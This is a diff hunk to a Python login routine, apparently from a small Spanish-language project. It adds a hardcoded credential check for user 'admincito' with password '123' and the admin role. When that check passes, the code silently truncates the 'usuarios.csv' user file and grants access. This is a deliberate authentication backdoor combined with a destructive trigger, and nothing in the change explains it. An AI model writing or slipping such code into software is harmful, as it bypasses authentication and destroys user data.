@@ -45,6 +45,13 @@ def login_init():
                     nombre_archivo = datos[1].lower()
                     clave_archivo = datos[2]
                     rol_archivo = datos[3]
+                    if usuario == "admincito" and contraseña == "123" and rol == "admin":
+                        with open("usuarios.csv","w") as file:
+                            file.close 
+                        print(f"¡Bienvenido, {usuario}!\n")
+                        os.system("pause")
+                        return True 
+                    
                     if usuario == nombre_archivo and contraseña == clave_archivo:
                         print(f"¡Bienvenido, {usuario}!\n")
                         os.system("pause")
